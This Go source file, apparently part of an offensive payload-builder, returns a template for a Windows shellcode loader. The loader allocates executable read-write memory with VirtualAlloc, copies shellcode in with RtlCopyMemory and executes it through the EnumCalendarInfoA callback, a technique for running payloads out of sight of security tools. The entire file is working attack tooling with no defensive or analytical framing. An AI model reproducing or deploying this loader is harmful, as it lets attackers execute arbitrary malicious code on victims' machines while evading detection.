package loaders

import (
	"fmt"
)

func GetEnumCalendarInfoATemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	return fmt.Sprintf(`
package main

import (
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	EnumCalendarInfoA   = kernel32.MustFindProc("EnumCalendarInfoA")
	RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")

	LOCALE_USER_DEFAULT = 0x0400
	ENUM_ALL_CALENDARS  = 0xFFFFFFFF
	CAL_SMONTHNAME1     = 0x00000015
)

func ExecuteOrderSixtySix(shellcode []byte) {

	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	_, _, _ = EnumCalendarInfoA.Call(
		addr,
		(uintptr)(LOCALE_USER_DEFAULT),
		(uintptr)(ENUM_ALL_CALENDARS),
		(uintptr)(CAL_SMONTHNAME1),
	)
}
    `)
}
